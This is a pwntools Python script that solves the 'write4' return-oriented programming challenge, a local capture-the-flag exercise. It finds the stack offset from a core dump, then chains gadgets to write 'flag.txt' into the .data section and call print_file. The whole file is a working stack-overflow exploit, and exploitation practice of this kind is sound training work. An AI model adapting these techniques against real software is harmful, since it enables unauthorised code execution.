from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-peda
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './write4'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


def find_eip(pattern_size, p):
    # We will send a 'cyclic' pattern which overwrites the return address on the stack
    payload = cyclic(pattern_size)
    # PWN
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Open up the corefile
    core = p.corefile
    # Print out the address of RSP at the time of crashing
    rsp_value = core.rsp
    pattern = core.read(rsp_value, 4)
    rip_offset = cyclic_find(pattern)
    info('located RIP offset at {a}'.format(a=rip_offset))
    # Return the EIP offset
    return rip_offset


# Start program
io = start()

# Address of .data section (size=8 bytes)
data_section_address = 0x0000000000601038

# We will pop address of .data section into r14
# Then pop the string (flag.txt) into r15
pop_r14_pop_r15 = 0x0000000000400690  # pop r14; pop r15; ret;

# We will then move the string from r15 (flag.txt) into memory location stored in r14
mov_r14_r15 = 0x0000000000400628  # mov qword ptr [r14], r15; ret;

# Needed at the end to get the flag.txt string into RDI where it will be used as param to print_file
pop_rdi = 0x0000000000400693  # pop rdi; ret;

# Finally we call print file function, passing in the address of the string (flag.txt)
print_file = 0x0000000000400620

# Print out important addresses
info("%#x data_section_address", data_section_address)
info("%#x pop_r14_pop_r15", pop_r14_pop_r15)
info("%#x mov_r14_r15", mov_r14_r15)
info("%#x print_file", print_file)

# Pass in pattern_size, get back EIP offset
eip_offset = find_eip(100, start())

# Craft payload which injects "flag.txt" into data section of memory
# And calls print_file() with the string memory location
payload = flat(
    asm('nop') * eip_offset,  # Offset - 44 bytes
    pop_r14_pop_r15,  # Pop .data (1) location into r14 and 4 byte string (2) to r15
    data_section_address,  # 1
    'flag.txt',  # 2 - Note we can do 8 bytes as 64-bit
    mov_r14_r15,  # Move string (2) to memory location (1) stored in r14

    # Pop the data address to RDI and call print_file
    pop_rdi,
    data_section_address,
    print_file
)

# Send the payload to a new copy of the process
io = start()
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')

# Get our flag!
flag = io.recv()
success(flag)
